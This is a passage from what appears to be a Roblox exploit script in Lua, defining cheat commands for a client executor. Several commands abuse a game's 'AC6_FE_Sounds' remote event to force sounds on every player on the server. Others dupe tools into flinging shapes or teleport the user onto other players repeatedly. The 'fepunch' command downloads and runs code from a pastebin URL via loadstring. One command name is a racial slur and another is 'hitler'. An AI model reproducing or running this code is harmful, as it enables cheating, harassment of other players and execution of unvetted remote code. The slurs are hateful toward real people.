Anim.Disabled = true 
Anim.Parent = Player 
end 
elseif value == "re-anim" then 
Anim = Player:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = false 
Anim.Parent = Holder 
end 
end 
end 
function Down(ml) 
for i=1, ml.velocity.y/3 do 
ml.velocity = ml.velocity+Vector3.new(0,-4.25,0) 
wait() 
end 
ml:Remove() 
end 
function Flip() 
if debounce==true then return end
debounce=true
Char = player.Character 
Human = Char.Humanoid 
Torso = Char.Torso 
CF = Torso.CFrame 
Human.PlatformStand = true
VelUp = Instance.new("BodyVelocity") 
VelUp.velocity = Vector3.new(0,50,0)+Torso.CFrame.lookVector*26 --Middle (0,0,0). Change for height.
VelUp.P = VelUp.P*2 
VelUp.maxForce = Vector3.new(10000,10000,10000)*999 
VelUp.Parent = Torso 
coroutine.resume(coroutine.create(Down),VelUp) 
Gyro = Instance.new("BodyGyro") 
Gyro.P = Gyro.P*10 
Gyro.maxTorque = Vector3.new(100000,100000,100000)*999 
Gyro.cframe = CF 
Gyro.Parent = Torso 
for i=1, 1.5 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-3.5,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
for i=1, 9 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(0,math.pi/4.5,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
for i=1, 10.5 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-7,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
Gyro.cframe = CF 
wait()
Gyro:Remove()
Human.PlatformStand = false
_restoreproperties() 
debounce=false
end 
function onActive(mouse) 
player = game.Players.LocalPlayer 
if player==nil then return end 
mouse.Button1Down:connect(function() Flip() end) 
end 
script.Parent = t.Selected:connect(onActive) 
 end)

addcmd('drill',{},
function(args, speaker)

local toolamount = 80 -- How long the tornado is
local tornadosize = 1 -- The size of how big the opening of the tornado is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, -index * .1, 0)) * CFrame.Angles(math.rad(90), 0, math.tan(index * 0.5))
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)






addcmd('hitler',{},
function(args, speaker)
for _,v in pairs (game:GetDescendants()) do
if v:IsA("RemoteEvent") then
if v.Name == "AC6_FE_Sounds" then
local remote = v
local ID = 2664417032

local A_1 = "newSound"
local A_2 = "fuick"
local A_3 = game:GetService("Workspace")
local A_4 = "rbxassetid://"..ID
local A_5 = 0
local A_6 = 10
local A_7 = true
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)

local A_1 = "playSound"
local A_2 = "fuick"
local Event = remote
Event:FireServer(A_1, A_2)

local A_1 = "updateSound"
local A_2 = "fuick"
local A_3 = "rbxassetid://"..ID
local A_4 = 1
local A_5 = 10
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5)

end
end
end
end)

addcmd('nolocate',{'unlocate'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		for i,c in pairs(PARENT:GetChildren()) do
			if c.Name == Players[v].Name..'_LC' then
				c:Destroy()
			end
		end
	end
end)

addcmd('turnintotool',{'tit'},
function(args, speaker)
game.Players.LocalPlayer.Character.Humanoid.HipHeight = -1
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 100, 0))
wait()
for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
end
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if (v:IsA("Tool")) then
        workspace.CurrentCamera.CameraSubject = v.Handle
        repeat
            v.GripPos = Vector3.new(0, 0, 99.1)
            wait()
        until game.Players.LocalPlayer.Character.Humanoid.Health == 0
end
end
end)  

addcmd('view',{'spectate'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		workspace.CurrentCamera.CameraSubject = Players[v].Character
		notify('Spectate','Viewing ' .. Players[v].Name)
	end
end)
addcmd('onetool',{},
function(args, speaker)
local toolamount = 40 -- How long the tornado is
local tornadosize = 3 -- The size of how big the opening of the tornado is

-- Don't edit script unless you know what you're doing. If you wanna add this into a script, please give credits and message me on discord that you added it in a script at Cyclically#4905

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, math.rad(index * 0), 0))
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

addcmd('onionring',{},
function(args, speaker)
local dankamount = 40 
local coolness = 20



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= dankamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
for i = .1, 2 do
tool.Grip = CFrame.new(Vector3.new(math.sin(index - i), coolness, i)) * CFrame.Angles(math.sin(index + i), index, i)
tool.Parent = LocalPlayer.Character
end
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = coolness
end)

addcmd('blindtool',{},
function(args, speaker)
game.Players.LocalPlayer.Character.Animate.toolnone.ToolNoneAnim.AnimationId = "nil"
wait()
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 0
noclip = true
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
end
end)
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CustomPhysicalProperties = PhysicalProperties.new(math.huge,math.huge,math.huge,math.huge,math.huge)
wait()
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
   if (v:IsA("Tool")) then
v.GripPos = Vector3.new(0,1000000000000000,0)
end
end
game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool").Parent = game.Players.LocalPlayer.Character
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "q" then
   local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "e" then
     local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "r" then
    local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "t" then
    local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
repeat
noclip = true
wait()
until game.Players.LocalPlayer.Character.Humanoid.Health == 0
wait()
noclip = false
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "q" then
   local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "e" then
    local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "r" then
    local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
plr = game.Players.LocalPlayer
mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
if key == "t" then
     local Seconds = 0.4
if not game:GetService("Players").LocalPlayer.Character then return end
for i,v in pairs(game:GetService("Players"):GetPlayers()) do
if v.Character then
for i,x in pairs(v.Character:GetChildren()) do
if x.Name == "HumanoidRootPart" then
for i,z in pairs(game:GetService("Players").LocalPlayer.Character:GetChildren()) do
if z.Name == "HumanoidRootPart" then
z.CFrame = x.CFrame
wait(Seconds)
end
end
end
end
end
end
end
end)
end)


addcmd('fepunch',{},
function(args, speaker)

Punch_Key = 'q'

Spray_Cans = 0

Strength = 9e9
--// MAIN //--

loadstring(game:HttpGet("https://pastebin.com/raw/HQ9KUnJ5", true))()
end)

addcmd('lookatme',{},
function(args, speaker)
for _,v in pairs (game:GetDescendants()) do
if v:IsA("RemoteEvent") then
if v.Name == "AC6_FE_Sounds" then
local remote = v
local ID = 1795969041

local A_1 = "newSound"
local A_2 = "fuick"
local A_3 = game:GetService("Workspace")
local A_4 = "rbxassetid://"..ID
local A_5 = 0
local A_6 = 10
local A_7 = true
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)

local A_1 = "playSound"
local A_2 = "fuick"
local Event = remote
Event:FireServer(A_1, A_2)

local A_1 = "updateSound"
local A_2 = "fuick"
local A_3 = "rbxassetid://"..ID
local A_4 = 1
local A_5 = 10
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5)

end
end
end
end)

addcmd('nigger',{},
function(args, speaker)
for _,v in pairs (game:GetDescendants()) do
if v:IsA("RemoteEvent") then
if v.Name == "AC6_FE_Sounds" then
local remote = v
local ID = 2466291217

local A_1 = "newSound"
local A_2 = "fuick"
local A_3 = game:GetService("Workspace")
local A_4 = "rbxassetid://"..ID
local A_5 = 0
local A_6 = 10
local A_7 = true
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)

local A_1 = "playSound"
local A_2 = "fuick"
local Event = remote
Event:FireServer(A_1, A_2)

local A_1 = "updateSound"
local A_2 = "fuick"
local A_3 = "rbxassetid://"..ID
local A_4 = 1
local A_5 = 10
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5)

end
end
end
end)

addcmd('smurf',{},
function(args, speaker)
for _,v in pairs (game:GetDescendants()) do
if v:IsA("RemoteEvent") then
if v.Name == "AC6_FE_Sounds" then
local remote = v
local ID = 1967212114

local A_1 = "newSound"
local A_2 = "fuick"
local A_3 = game:GetService("Workspace")
local A_4 = "rbxassetid://"..ID
local A_5 = 0
local A_6 = 10
local A_7 = true
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5, A_6, A_7)

local A_1 = "playSound"
local A_2 = "fuick"
local Event = remote
Event:FireServer(A_1, A_2)

local A_1 = "updateSound"
local A_2 = "fuick"
local A_3 = "rbxassetid://"..ID
local A_4 = 1
local A_5 = 10
local Event = remote
Event:FireServer(A_1, A_2, A_3, A_4, A_5)

end
end
end
end)

addcmd('360',{},
function(args, speaker)

pl=game.Players.LocalPlayer
me=pl.Character
xl=me.Torso['Right Shoulder']
t=Instance.new("HopperBin",pl.Backpack)
t.Name="360"
local debounce=false
function _restoreproperties() 
Holder = player.Character 
Torso = Holder:FindFirstChild("Torso") 
RightS = Torso:FindFirstChild("Right Shoulder") 
LeftS = Torso:FindFirstChild("Left Shoulder") 
RightH = Torso:FindFirstChild("Right Hip") 
LeftH = Torso:FindFirstChild("Left Hip") 
RightS.MaxVelocity = .15 
LeftS.MaxVelocity = .15 
RightH.MaxVelocity = .1 
LeftH.MaxVelocity = .1 
RightS.DesiredAngle = 0 
LeftS.DesiredAngle = 0 
LeftH.DesiredAngle = 0 
RightH.DesiredAngle = 0 
end 
function ManageAnimation(value) 
Holder = player.Character 
Player = player 
if value == "no anim" then 
Anim = Holder:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = true 
Anim.Parent = Player 
end 
elseif value == "re-anim" then 
Anim = Player:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = false 
Anim.Parent = Holder 
end 
end 
end 
function Down(ml) 
for i=1, ml.velocity.y/3 do 
ml.velocity = ml.velocity+Vector3.new(0,-4.25,0) 
wait() 
end 
ml:Remove() 
end 
function Flip() 
if debounce==true then return end
debounce=true
Char = player.Character 
Human = Char.Humanoid 
Torso = Char.Torso 
CF = Torso.CFrame 
Human.PlatformStand = true
VelUp = Instance.new("BodyVelocity") 
VelUp.velocity = Vector3.new(0,50,0)+Torso.CFrame.lookVector*26 --Middle (0,0,0). Change for height.
VelUp.P = VelUp.P*2 
VelUp.maxForce = Vector3.new(10000,10000,10000)*999 
VelUp.Parent = Torso 
coroutine.resume(coroutine.create(Down),VelUp) 
Gyro = Instance.new("BodyGyro") 
Gyro.P = Gyro.P*10 
Gyro.maxTorque = Vector3.new(100000,100000,100000)*999 
Gyro.cframe = CF 
Gyro.Parent = Torso 
for i=1, 5 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-5,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
wait(0)
for i=1, 9 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(0,math.pi/4.5,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
for i=1, 5 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-5,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
Gyro.cframe = CF 
wait()
Gyro:Remove()
Human.PlatformStand = false
_restoreproperties() 
debounce=false
end 
function onActive(mouse) 
player = game.Players.LocalPlayer 
if player==nil then return end 
mouse.Button1Down:connect(function() Flip() end) 
end 
script.Parent = t.Selected:connect(onActive) 
 

end)

addcmd('lunge',{},
function(args, speaker)

pl=game.Players.LocalPlayer
me=pl.Character
xl=me.Torso['Right Shoulder']
t=Instance.new("HopperBin",pl.Backpack)
t.Name="Lunge"

local debounce=false
function _restoreproperties() 
Holder = player.Character 
Torso = Holder:FindFirstChild("Torso") 
RightS = Torso:FindFirstChild("Right Shoulder") 
LeftS = Torso:FindFirstChild("Left Shoulder") 
RightH = Torso:FindFirstChild("Right Hip") 
LeftH = Torso:FindFirstChild("Left Hip") 
RightS.MaxVelocity = .15 
LeftS.MaxVelocity = .15 
RightH.MaxVelocity = .1 
LeftH.MaxVelocity = .1 
RightS.DesiredAngle = 0 
LeftS.DesiredAngle = 0 
LeftH.DesiredAngle = 0 
RightH.DesiredAngle = 0 
end 
function ManageAnimation(value) 
Holder = player.Character 
Player = player 
if value == "no anim" then 
Anim = Holder:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = true 
Anim.Parent = Player 
end 
elseif value == "re-anim" then 
Anim = Player:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = false 
Anim.Parent = Holder 
end 
end 
end 
function Down(ml) 
for i=1, ml.velocity.y/3 do 
ml.velocity = ml.velocity+Vector3.new(0,-4.25,0) 
wait() 
end 
ml:Remove() 
end 
function Flip() 
if debounce==true then return end
debounce=true
Char = player.Character 
Human = Char.Humanoid 
Torso = Char.Torso 
CF = Torso.CFrame 
Human.PlatformStand = true
VelUp = Instance.new("BodyVelocity") 
VelUp.velocity = Vector3.new(0,35,0)+Torso.CFrame.lookVector*50 --Middle (0,0,0). Change for height.
VelUp.P = VelUp.P*2 
VelUp.maxForce = Vector3.new(10000,10000,10000)*999 
VelUp.Parent = Torso 
coroutine.resume(coroutine.create(Down),VelUp) 
Gyro = Instance.new("BodyGyro") 
Gyro.P = Gyro.P*10 
Gyro.maxTorque = Vector3.new(100000,100000,100000)*999 
Gyro.cframe = CF 
Gyro.Parent = Torso 
for i=1, 14 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-60,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
Gyro.cframe = CF 
wait()
Gyro:Remove()
Human.PlatformStand = false
_restoreproperties() 
debounce=false
end 
function onActive(mouse) 
player = game.Players.LocalPlayer 
if player==nil then return end 
mouse.Button1Down:connect(function() Flip() end) 
end 
script.Parent = t.Selected:connect(onActive) 
 

end)

addcmd('doublefrontflip',{},
function(args, speaker)


pl=game.Players.LocalPlayer
me=pl.Character
xl=me.Torso['Right Shoulder']
t=Instance.new("HopperBin",pl.Backpack)
t.Name="Double Front Flip"
local debounce=false
function _restoreproperties() 
Holder = player.Character 
Torso = Holder:FindFirstChild("Torso") 
RightS = Torso:FindFirstChild("Right Shoulder") 
LeftS = Torso:FindFirstChild("Left Shoulder") 
RightH = Torso:FindFirstChild("Right Hip") 
LeftH = Torso:FindFirstChild("Left Hip") 
RightS.MaxVelocity = .15 
LeftS.MaxVelocity = .15 
RightH.MaxVelocity = .1 
LeftH.MaxVelocity = .1 
RightS.DesiredAngle = 0 
LeftS.DesiredAngle = 0 
LeftH.DesiredAngle = 0 
RightH.DesiredAngle = 0 
end 
function ManageAnimation(value) 
Holder = player.Character 
Player = player 
if value == "no anim" then 
Anim = Holder:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = true 
Anim.Parent = Player 
end 
elseif value == "re-anim" then 
Anim = Player:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = false 
Anim.Parent = Holder 
end 
end 
end 
function Down(ml) 
for i=1, ml.velocity.y/3 do 
ml.velocity = ml.velocity+Vector3.new(0,-4.25,0) 
wait() 
end 
ml:Remove() 
end 
function Flip() 
if debounce==true then return end
debounce=true
Char = player.Character 
Human = Char.Humanoid 
Torso = Char.Torso 
CF = Torso.CFrame 
Human.PlatformStand = true
VelUp = Instance.new("BodyVelocity") 
VelUp.velocity = Vector3.new(0,60,0)+Torso.CFrame.lookVector*26 --Middle (0,0,0). Change for height.
VelUp.P = VelUp.P*2 
VelUp.maxForce = Vector3.new(10000,10000,10000)*999 
VelUp.Parent = Torso 
coroutine.resume(coroutine.create(Down),VelUp) 
Gyro = Instance.new("BodyGyro") 
Gyro.P = Gyro.P*10 
Gyro.maxTorque = Vector3.new(100000,100000,100000)*999 
Gyro.cframe = CF 
Gyro.Parent = Torso 
for i=2, 28 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/-7,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
Gyro.cframe = CF 
wait()
Gyro:Remove()
Human.PlatformStand = false
_restoreproperties() 
debounce=false
end 
function onActive(mouse) 
player = game.Players.LocalPlayer 
if player==nil then return end 
mouse.Button1Down:connect(function() Flip() end) 
end 
script.Parent = t.Selected:connect(onActive) 
 

end)

addcmd('block',{},
function(args, speaker)
local dankamount = 60 
local coolness = 1



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= dankamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
for i = .3, 1 do
tool.Grip = CFrame.new(Vector3.new(math.sin(index + i), -coolness, i)) * CFrame.Angles(i, 0, 0)
tool.Parent = LocalPlayer.Character
end
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)


addcmd('doublebackflip',{},
function(args, speaker)


pl=game.Players.LocalPlayer
me=pl.Character
xl=me.Torso['Right Shoulder']
t=Instance.new("HopperBin",pl.Backpack)
t.Name="Double Backflip"
local debounce=false
function _restoreproperties() 
Holder = player.Character 
Torso = Holder:FindFirstChild("Torso") 
RightS = Torso:FindFirstChild("Right Shoulder") 
LeftS = Torso:FindFirstChild("Left Shoulder") 
RightH = Torso:FindFirstChild("Right Hip") 
LeftH = Torso:FindFirstChild("Left Hip") 
RightS.MaxVelocity = .15 
LeftS.MaxVelocity = .15 
RightH.MaxVelocity = .1 
LeftH.MaxVelocity = .1 
RightS.DesiredAngle = 0 
LeftS.DesiredAngle = 0 
LeftH.DesiredAngle = 0 
RightH.DesiredAngle = 0 
end 
function ManageAnimation(value) 
Holder = player.Character 
Player = player 
if value == "no anim" then 
Anim = Holder:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = true 
Anim.Parent = Player 
end 
elseif value == "re-anim" then 
Anim = Player:FindFirstChild("Animate") 
if Anim~=nil then 
Anim.Disabled = false 
Anim.Parent = Holder 
end 
end 
end 
function Down(ml) 
for i=1, ml.velocity.y/3 do 
ml.velocity = ml.velocity+Vector3.new(0,-4.25,0) 
wait() 
end 
ml:Remove() 
end 
function Flip() 
if debounce==true then return end
debounce=true
Char = player.Character 
Human = Char.Humanoid 
Torso = Char.Torso 
CF = Torso.CFrame 
Human.PlatformStand = true
VelUp = Instance.new("BodyVelocity") 
VelUp.velocity = Vector3.new(0,60,0)+Torso.CFrame.lookVector*-26 --Middle (0,0,0). Change for height.
VelUp.P = VelUp.P*2 
VelUp.maxForce = Vector3.new(10000,10000,10000)*999 
VelUp.Parent = Torso 
coroutine.resume(coroutine.create(Down),VelUp) 
Gyro = Instance.new("BodyGyro") 
Gyro.P = Gyro.P*10 
Gyro.maxTorque = Vector3.new(100000,100000,100000)*999 
Gyro.cframe = CF 
Gyro.Parent = Torso 
for i=2, 28 do --The amount of time your guy flips.
Gyro.cframe = Gyro.cframe*CFrame.fromEulerAnglesXYZ(math.pi/7,0,0) --The amount of flips. 1 = -16, 2 = -8
wait() 
end 
Gyro.cframe = CF 
wait()
Gyro:Remove()
Human.PlatformStand = false
_restoreproperties() 
debounce=false
end 
function onActive(mouse) 
player = game.Players.LocalPlayer 
if player==nil then return end 
mouse.Button1Down:connect(function() Flip() end) 
end 
script.Parent = t.Selected:connect(onActive) 
 

end)

addcmd('littleball',{'lb'},
function()
local toolamount = 50 -- How much covered the ball is
local ballsize = 6 -- How big the ball is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
